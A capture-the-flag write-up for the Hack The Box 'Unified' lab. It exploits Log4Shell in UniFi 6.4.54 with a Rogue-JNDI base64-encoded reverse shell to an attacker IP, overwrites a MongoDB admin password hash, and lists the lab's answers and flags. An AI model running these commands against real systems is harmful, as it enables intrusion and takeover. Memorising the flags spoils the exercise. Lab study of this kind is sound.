# Unified (Tier 2)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark> 2
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Vulnerability Assessment / Databases / Custom Applications / MongoDB / Java\
  &#x20;              / Reconnaissance / Clear Text Credentials / Default Credentials / Code Injection

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=2</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.46.173 -p- -Pn --min-rate 2500 -oN scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

> Answer: _**22,6789,8080,8443**_

***

* Then I did an exhaustive scan to learn more about the services running on the open ports

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.46.173 -p22,6789,8080,8443,8843,8880 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (387).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (388).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (389).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

> Answer: _**UniFi Network**_

***

* I found an HTTP service running on ports 8443 and 8080, so I went to the browser to explore them, starting with port 8443. There I found a login page from a software named _Unifi,_ as identified in the scan, and let me know the version of this software was _6.4.54_. I also tried logging in with common credentials, but it didn't work. After that, I explored the _Forgot Password_ option, which asked for an email to send a verification message, but as I was not registered, it wouldn't work

<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

> Answer: _**6.4.54**_

***

* As I knew the software's version, I tried searching for any possible CVE related to it. After some research, I found this version was vulnerable to [_CVE-2021-44228_](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)_,_ the well-known _Log4Shell_ vulnerability

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption><p><a href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi</a></p></figcaption></figure>

***

* With this and reading more about this vulnerability, I answered the next questions&#x20;

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

> Answer: _**CVE-2021-44228**_

***

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ldap**_

***

* So first, to start the process for the exploitation, I intercepted the petition from the login page and modified it, inserting a payload in the _remember_ parameter. Then I set up a listener with [_tcpdump_](../../networks/tools-and-utilities.md#tcpdump) to check all the traffic over TCP, specifying in this case to listen on port 389, the default port for the _LDAP_ service communications. Then I resubmitted the petition and checked the listener to confirm the service was connecting back to my machine, and in fact, it was

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo tcpdump -i tun0 port 389
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn the complete process for the _Log4Shell_ vulnerability and its exploitation, you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
{% endhint %}

***

* With this, I answered the next questions

<figure><img src="../../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure>

> Answer: _**389**_

***

<figure><img src="../../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>

> Answer: _**tcpdump**_

***

* Knowing this, I created a payload and mounted a server with _Rogue-JNDI_ to establish the communication and try to gain a reverse shell from the target machine. Then I set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to receive communication and resent the petition this time pointing to the mounted server, and successfully caught a shell from the target, confirming it with the `whomai` command. Then I sanitized the terminal to interact better with it

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTE3LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.117"
<strong>nc -nvlp444
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

***

* Once in the system, I could search for local information about users, so first I went to the _/home_ directory where I found a user named _michael,_ and checking the files it had, found a _user.txt_ file from which I retrieved the user flag

<figure><img src="../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

***

* Then I had to find a way to escalate privileges. I started checking on the `sudo` execution permissions for the user, but the command wasn't on the system, and testing it with some other common commands for retrieving information, they were not found. So I tried looking at the services running locally and found that a [_MongoDB_](https://www.mongodb.com/) database was being deployed on port 27117

{% code overflow="wrap" lineNumbers="true" %}
```bash
ps aux | grep "127.0.0.1"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (397).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

> Answer: _**27117**_

***

* As the database was deployed locally, I could only interact with it through the system or try to create a tunnel with SSH to connect from our machine. The second wasn't an option as we didn't have any credentials for SSH, so I tried looking if the [_Mongocli_](../../database-attacks/tools-and-utilities.md#mongocli) utility was installed on the system, and it was, so I used it to connect to the database

{% code overflow="wrap" lineNumbers="true" %}
```bash
mongo --version
mongo --port 27117
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>

***

* Once inside, I wanted to retrieve sensitive information, but I didn't know the components of the database, so first I searched for possible default names related to the _UniFi_ software, and with some research, found a [repository](https://gist.github.com/AmazingTurtle/e8a68a0cbe501bae15343aacbf42a1d8) that could help us to retrieve information and restore values to default for this specific software

<figure><img src="../../.gitbook/assets/image (399).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* Following the guide, I learned the default database for _UniFi_ was _ace_, so I accessed it and checked the collections it had. The _admin_ collection caught my attention, so I retrieved its information, and this revealed sensitive information about the _administrator_ user, including its email and the hash for the password it used

{% code overflow="wrap" lineNumbers="true" %}
```mongodb
use ace;
show collections;
db.admin.find();
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (403).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the next questions

<figure><img src="../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ace**_

***

<figure><img src="../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

> Answer: _**db.admin.find()**_

***

* So I tried changing the value of the hash for one that represented an arbitrary password, to impersonate the administrator user. So I used a prehashed value from the previously found repository and tried to update this in the database. After that, as I didn't get any error, I assumed it had worked, and then went again to the login page to try using the credentials I had set, having access to a dashboard for a network configuration software.

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"># We used the SHA512 for Ch4ngeM3VeryQu!ck taken from the GitHub guide
<strong>db.admin.update({ "name": "administrator" }, { $set: { "x_shadow": "$6$9Ter1EZ9$4RCTnLfeDJsdAQ16M5d1d5Ztg2CE1J2IDlbAPSUcqYOoxjEEcpMQag41dtCQv2cJ.n9kvlx46hNT78dngJBVt0" } });
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Impersonification via credentials change on _MongoDB,_ you can go here
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

> Answer: _**db.admin.update()**_

***

* Being there, I explored the features the software had, and reaching the _Settings>Site_ tab, I noticed there was a _Device Authentication_ section with some configurations for the SSH connection under the network, leaking the password to connect as the _root_ user through this method

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

***

* With this and the previously found user flag, I answered the next questions

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

> Answer: _**NotACrackablePassword4U2022**_

***

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

> Answer: _**6ced1a6a89e666c0620cdb10262ba127**_

***

* So I tried connecting through SSH with these credentials and got in successfully as the _root_ privileged user. I did an extra sanitization just to interact better with the terminal

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh root@10.129.46.173
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I went to the _/root_ folder to look at its content, noticing a _root.txt_ file, and reading its content from where I retrieved the root flag

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**e50bc93c75b634e4b272d2f771c33681**_
